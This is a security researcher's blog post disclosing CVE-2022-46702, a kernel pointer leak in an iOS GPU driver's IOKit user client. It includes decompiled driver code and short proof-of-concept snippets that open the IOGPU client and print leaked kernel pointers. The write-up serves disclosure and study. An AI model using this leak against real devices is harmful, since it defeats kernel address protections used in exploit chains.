<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2022-46702: Remember to Clean Up the Memory | </title><meta name="keywords" content="Vulnerability,PWN,XNU,IOKit,iOS"><meta name="author" content="KpwnZ"><meta name="copyright" content="KpwnZ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVE-2022-46702: Remember to Clean Up the Memory As I tinkered with my first iPhone and jailbroke it, I was struck by the endless possibilities for customization and exploration. That’s when my interes">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-46702: Remember to Clean Up the Memory">
<meta property="og:url" content="https://kpwnz.github.io/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/index.html">
<meta property="og:site_name">
<meta property="og:description" content="CVE-2022-46702: Remember to Clean Up the Memory As I tinkered with my first iPhone and jailbroke it, I was struck by the endless possibilities for customization and exploration. That’s when my interes">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://source.unsplash.com/featured/?landscape,tech,life">
<meta property="article:published_time" content="2022-12-23T06:28:55.000Z">
<meta property="article:modified_time" content="2023-04-24T19:13:47.987Z">
<meta property="article:author" content="KpwnZ">
<meta property="article:tag" content="Vulnerability">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="XNU">
<meta property="article:tag" content="IOKit">
<meta property="article:tag" content="iOS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://source.unsplash.com/featured/?landscape,tech,life"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kpwnz.github.io/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2022-46702: Remember to Clean Up the Memory',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-24 12:13:47'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/22996989?s=400&amp;u=470b81ce0dd0fd2e15880f564e1bef0ba9655225&amp;v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://source.unsplash.com/featured/?landscape,tech,life')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2022-46702: Remember to Clean Up the Memory</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-12-23T06:28:55.000Z" title="Created 2022-12-22 22:28:55">2022-12-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-04-24T19:13:47.987Z" title="Updated 2023-04-24 12:13:47">2023-04-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2022-46702: Remember to Clean Up the Memory"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>CVE-2022-46702: Remember to Clean Up the Memory</h1>
<p>As I tinkered with my first iPhone and jailbroke it, I was struck by the endless possibilities for customization and exploration. That’s when my interest in security research truly took off. I immersed myself in the study of reverse engineering and even became an iOS tweak developer. My curiosity and passion for software security only continued to grow as I delved deeper into this field. And I am excited to share the details of my first CVE, CVE-2022-46702: a kernel information leak in the GPU driver. This discovery has been a highlight of my security research career so far, and I can’t wait to see what other exciting challenges and opportunities lie ahead.</p>
<h2 id="IOKit">IOKit</h2>
<p>Before we start, I’d like to go through the concept of IOKit briefly. Since there are many detailed documents about IOKit, I will only cover the basic idea of it here.</p>
<p>IOKit is a collection of low-level frameworks, libraries, tools, and other things for developing drivers in macOS, iOS, iPadOS, and so on.</p>
<p>In userland, we can interact with IOKit kernel extensions with their user clients. You need to get a “handle” of it first with <code>IOServiceOpen()</code>, which will return a Mach Port. User clients can expose the interface to userland with external methods, and in most of cases, the external methods will be stored in an external methods table. Then just like <code>ioctl()</code>, you can use <code>IOConnectCallMethod()</code> to call the external methods implemented in user clients.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> </span></span><br><span class="line"><span class="function"><span class="title">IOConnectCallMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">mach_port_t</span> connection,         <span class="comment">// the Mach Port of client</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint32_t</span> selector,              <span class="comment">// method selector</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> *input, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint32_t</span> inputCnt, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">void</span> *inputStruct, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">size_t</span> inputStructCnt,          <span class="comment">// size of inputStruct</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint64_t</span> *output, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint32_t</span> *outputCnt,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> *outputStruct, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">size_t</span> *outputStructCnt)</span></span>;</span><br></pre></td></tr></table></figure>
<p>Apple also provides some variants, such as  <code>IOConnectCallAsyncMethod()</code>, and they share the same idea.</p>
<h3 id="Dispatch-table">Dispatch table</h3>
<p><code>struct IOExternalMethodDispatch</code> is used to manage the implemented external methods.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">IOReturn</span> <span class="params">(*IOExternalMethodAction)</span><span class="params">(OSObject * target, <span class="keyword">void</span> * reference,</span></span></span><br><span class="line"><span class="params"><span class="function">    IOExternalMethodArguments * arguments)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOExternalMethodDispatch</span> &#123;</span></span><br><span class="line">    IOExternalMethodAction function;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkScalarInputCount;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkStructureInputSize;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkScalarOutputCount;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkStructureOutputSize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>function</code> is a function pointer to an external method, and the following fields describe the input and output data.</p>
<h2 id="The-kernel-info-leak">The kernel info leak</h2>
<p>The vulnerability is in the GPU driver of iOS. <code>AGXDeviceUserClient::performanceCounterSamplerControl()</code> handles many commands about sampling. In command <code>0xF</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">AGXDeviceUserClient::performanceCounterSamplerControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        AGXDeviceUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 structInput,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 structOutput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = <span class="number">3758097084LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !structInput || *structInput &gt; <span class="number">0x16</span> )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  <span class="comment">// ..........</span></span><br><span class="line">					<span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">            v27 = *(<span class="keyword">unsigned</span> __int8 *)(structInput + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span> ( a1-&gt;AGXShared.field_190 &lt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v27 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v28 = *(_QWORD *)(structInput + <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v29 = *(_DWORD *)(structInput + <span class="number">8</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v29 &gt;= <span class="number">2</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v30 = <span class="number">393223</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *(_BYTE *)(structInput + <span class="number">4</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  p_field_58 = &amp;a1-&gt;IOGPUDevice.field_58;</span><br><span class="line">                  v30 = <span class="number">262151</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  p_field_58 = &amp;a1-&gt;IOGPUDevice.io_gpu-&gt;IOGPU.field_d0;</span><br><span class="line">                &#125;</span><br><span class="line">                v32 = AGXShared::<span class="built_in">createMappedBuffer</span>(</span><br><span class="line">                        a1,</span><br><span class="line">                        (task *)a1-&gt;IOGPUDevice.field_50,</span><br><span class="line">                        (IOGPUTask *)*p_field_58,</span><br><span class="line">                        v28,</span><br><span class="line">                        v29,</span><br><span class="line">                        v30);</span><br><span class="line">                <span class="keyword">if</span> ( v32 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v33 = v32;</span><br><span class="line">                  ((<span class="built_in"><span class="keyword">void</span></span> (__fastcall *)(AGXShared *, __int64, __int64))a1-&gt;vtable-&gt;AGXShared.setSourceBufferMap)(</span><br><span class="line">                    a1,</span><br><span class="line">                    v27,</span><br><span class="line">                    v32);</span><br><span class="line">                  *(_QWORD *)(structInput + <span class="number">16</span>) = v33;</span><br><span class="line">                  structInput+<span class="number">16</span> = v33 = v32 </span><br><span class="line">LABEL_14:         </span><br><span class="line">                  v34 = ((__int64 (*)(<span class="keyword">void</span>))a1-&gt;IOGPUDevice.io_gpu-&gt;AGXAccelerator.pref_ctl-&gt;vtable-&gt;AGXPerfCtrSamplerGen11.processControlCommand)();</span><br><span class="line">                  </span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( *(_QWORD *)(a1-&gt;AGXShared.field_188 + <span class="number">8LL</span> * *(<span class="keyword">unsigned</span> __int8 *)(structInput + <span class="number">4</span>)) )</span><br><span class="line">            &#123;</span><br><span class="line">              v34 = ((__int64 (*)(<span class="keyword">void</span>))a1-&gt;IOGPUDevice.io_gpu-&gt;AGXAccelerator.pref_ctl-&gt;vtable-&gt;AGXPerfCtrSamplerGen11.processControlCommand)();</span><br><span class="line">              ((<span class="built_in"><span class="keyword">void</span></span> (__fastcall *)(AGXShared *, __int64, _QWORD))a1-&gt;vtable-&gt;AGXShared.setSourceBufferMap)(</span><br><span class="line">                a1,</span><br><span class="line">                v27,</span><br><span class="line">                <span class="number">0LL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v34 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>Notice that</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v32 = AGXShared::<span class="built_in">createMappedBuffer</span>(</span><br><span class="line">                        a1,</span><br><span class="line">                        (task *)a1-&gt;IOGPUDevice.field_50,</span><br><span class="line">                        (IOGPUTask *)*p_field_58,</span><br><span class="line">                        v28,</span><br><span class="line">                        v29,</span><br><span class="line">                        v30);</span><br></pre></td></tr></table></figure>
<p>Pointer <code>v32</code> was then copied to <code>*(_QWORD *)(structInput + 16)</code>. <code>structInput</code> was passed to <code>a1-&gt;IOGPUDevice.io_gpu-&gt;AGXAccelerator.pref_ctl-&gt;vtable-&gt;AGXPerfCtrSamplerGen11.processControlCommand)();</code> as an argument.</p>
<p>When the function return,</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( structOutput )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = *(_OWORD *)(structInput + <span class="number">16</span>);</span><br><span class="line">      *structOutput = *(_OWORD *)structInput;</span><br><span class="line">      *(structOutput + <span class="number">16</span>) = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>*(_OWORD *)(structInput + 16); </code> was then assigned to <code>structOutput</code>. So we can directly retrieve a kernel pointer in userland.</p>
<h2 id="Exploitation">Exploitation</h2>
<p>The exploitation is pretty straightforward. To exploit this vulnerability in iOS 16, you need an entitlement first. But in iOS 14, we can invoke this method without special entitlement.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( IOGPUDevice::<span class="built_in">doesEntitlementExist</span>(io_gpu_device, <span class="string">&quot;com.apple.private.agx.performance-spi&quot;</span>)</span><br><span class="line">  &amp;&amp; (v8 = <span class="built_in">proc_find</span>(io_gpu_device-&gt;IOGPUDevice.field_60)) != <span class="number">0LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = v8;</span><br><span class="line">  v10 = <span class="built_in">csproc_get_platform_binary</span>() != <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">proc_rele</span>(v9);</span><br><span class="line">  v11 = <span class="number">4</span> * v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">io_service_t</span> service = <span class="built_in">IOServiceGetMatchingService</span>(kIOMasterPortDefault,</span><br><span class="line">                                                   <span class="built_in">IOServiceMatching</span>(<span class="string">&quot;IOGPU&quot;</span>));</span><br><span class="line">kr = <span class="built_in">IOServiceOpen</span>(service, <span class="built_in">mach_task_self</span>(), <span class="number">1</span>, &amp;conn);</span><br><span class="line"><span class="keyword">if</span> (kr || !conn) &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;failed to open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Simply open the user client first.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kr = <span class="built_in">IOConnectCallStructMethod</span>(conn, getindex_method_start + <span class="number">5</span>, struct_input, <span class="built_in"><span class="keyword">sizeof</span></span>(struct_input), struct_output, &amp;struct_output_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak 0x%llx\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(struct_output + i * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">uint64_t</span> *)(struct_output + <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure>
<p>Then enjoy your kernel pointer.</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">KpwnZ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://kpwnz.github.io/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/">https://kpwnz.github.io/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnerability/">Vulnerability</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/XNU/">XNU</a><a class="post-meta__tags" href="/tags/IOKit/">IOKit</a><a class="post-meta__tags" href="/tags/iOS/">iOS</a></div><div class="post_share"><div class="social-share" data-image="https://source.unsplash.com/featured/?landscape,tech,life" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/"><img class="prev-cover" src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CVE-2020-11102: Escape from the Earth</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/29/evilCallback-CVE-2021-21225/"><img class="next-cover" src="https://source.unsplash.com/featured/?landscape,tech,life" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">evilCallback: CVE-2021-21225</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/02/01/Voucher-Port-and-Message-Exploit-CVE-2019-6225-on-macOS/" title="Voucher, Port and Message: Exploit CVE-2019-6225 on macOS"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-01</div><div class="title">Voucher, Port and Message: Exploit CVE-2019-6225 on macOS</div></div></a></div><div><a href="/2023/10/23/iOS-Userland-Exploitation-pwn1OS-in-N1CTF/" title="From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-23</div><div class="title">From JavaScript to Objective-C: iOS Userland Exploitation, pwn1OS in N1CTF</div></div></a></div><div><a href="/2022/10/03/Analyze-CVE-2022-32792-Faster-Than-Light-but-at-What-Cost/" title="Analyze CVE-2022-32792: Faster Than Light, but at What Cost?"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-03</div><div class="title">Analyze CVE-2022-32792: Faster Than Light, but at What Cost?</div></div></a></div><div><a href="/2021/11/03/CVE-2017-2370/" title="CVE-2017-2370"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-03</div><div class="title">CVE-2017-2370</div></div></a></div><div><a href="/2022/09/26/Code-Execution-by-Hijacking-IO-FILE-vtable-in-GLIBC-2-36-0x0/" title="Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x0]"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-26</div><div class="title">Code Execution by Faking IO_FILE->vtable in GLIBC 2.36 [0x0]</div></div></a></div><div><a href="/2023/04/25/CVE-2020-11102-Escape-from-the-Earth/" title="CVE-2020-11102: Escape from the Earth"><img class="cover" src="https://source.unsplash.com/featured/?landscape,tech,life" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-25</div><div class="title">CVE-2020-11102: Escape from the Earth</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/22996989?s=400&amp;u=470b81ce0dd0fd2e15880f564e1bef0ba9655225&amp;v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">KpwnZ</div><div class="author-info__description">~ shit post ~</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/KpwnZ"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">CVE-2022-46702: Remember to Clean Up the Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IOKit"><span class="toc-number">1.1.</span> <span class="toc-text">IOKit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dispatch-table"><span class="toc-number">1.1.1.</span> <span class="toc-text">Dispatch table</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-kernel-info-leak"><span class="toc-number">1.2.</span> <span class="toc-text">The kernel info leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.3.</span> <span class="toc-text">Exploitation</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas 